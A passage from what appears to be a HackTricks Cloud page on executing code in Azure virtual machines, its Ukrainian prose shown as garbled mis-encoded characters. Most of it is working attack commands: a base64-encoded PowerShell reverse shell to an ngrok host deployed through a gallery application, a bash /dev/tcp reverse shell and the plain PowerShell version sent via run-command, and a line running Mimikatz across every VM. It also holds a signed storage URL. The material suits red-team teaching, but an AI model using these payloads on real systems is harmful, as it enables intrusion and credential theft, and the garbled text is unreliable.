export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### –î–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

–¶–µ **–ø–æ—Å—Ç—ñ–π–Ω—ñ –¥–∞–Ω—ñ**, —è–∫—ñ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö —É –±—É–¥—å-—è–∫–∏–π —á–∞—Å. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ Azure –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è –≤—ñ–¥ AWS —Ç–∞ GCP, –æ—Å–∫—ñ–ª—å–∫–∏ **—è–∫—â–æ –≤–∏ –ø–æ–º—ñ—Å—Ç–∏—Ç–µ —Å–∫—Ä–∏–ø—Ç —Å—é–¥–∏, –≤—ñ–Ω –Ω–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**.

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –¥–∞–Ω—ñ

–ú–æ–∂–Ω–∞ –ø–µ—Ä–µ–¥–∞—Ç–∏ –¥–µ—è–∫—ñ –¥–∞–Ω—ñ –≤ VM, —è–∫—ñ –±—É–¥—É—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ –æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —à–ª—è—Ö–∞—Ö:

* –£ **Windows** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –¥–∞–Ω—ñ —Ä–æ–∑–º—ñ—â—É—é—Ç—å—Å—è –≤ `%SYSTEMDRIVE%\AzureData\CustomData.bin` —è–∫ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —ñ –Ω–µ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è.
* –£ **Linux** –≤–æ–Ω–∏ –∑–±–µ—Ä—ñ–≥–∞–ª–∏—Å—è –≤ `/var/lib/waagent/ovf-env.xml`, –∞ —Ç–µ–ø–µ—Ä –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ `/var/lib/waagent/CustomData/ovf-env.xml`
* **–ê–≥–µ–Ω—Ç Linux**: –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ –æ–±—Ä–æ–±–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –¥–∞–Ω—ñ, –ø–æ—Ç—Ä—ñ–±–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –æ–±—Ä–∞–∑ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏
* **cloud-init:** –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –æ–±—Ä–æ–±–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –¥–∞–Ω—ñ, —ñ —Ü—ñ –¥–∞–Ω—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤ [**–¥–µ–∫—ñ–ª—å–∫–æ—Ö —Ñ–æ—Ä–º–∞—Ç–∞—Ö**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html). –í—ñ–Ω –º–æ–∂–µ –ª–µ–≥–∫–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç, –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –π–æ–≥–æ –≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö –¥–∞–Ω–∏—Ö.
* –Ø —Å–ø—Ä–æ–±—É–≤–∞–≤, —â–æ–± —ñ Ubuntu, —ñ Debian –≤–∏–∫–æ–Ω—É–≤–∞–ª–∏ —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –≤–∏ —Å—é–¥–∏ –ø–æ–º—ñ—Å—Ç–∏–ª–∏.
* –¢–∞–∫–æ–∂ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ.
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **–ó–∞–ø—É—Å—Ç–∏—Ç–∏ –∫–æ–º–∞–Ω–¥—É**

–¶–µ –Ω–∞–π–æ—Å–Ω–æ–≤–Ω—ñ—à–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º, —è–∫–∏–π Azure –Ω–∞–¥–∞—î –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ —É –í–ú**. –ù–µ–æ–±—Ö—ñ–¥–Ω–µ –¥–æ–∑–≤–æ–ª–∏ - `Microsoft.Compute/virtualMachines/runCommand/action`.

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ü—Ä–∏–≤—ñ–ª–µ—ó–≤

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## –ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –î–æ—Å—Ç—É–ø

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## –ü—ñ—Å–ª—è –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## –ü–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
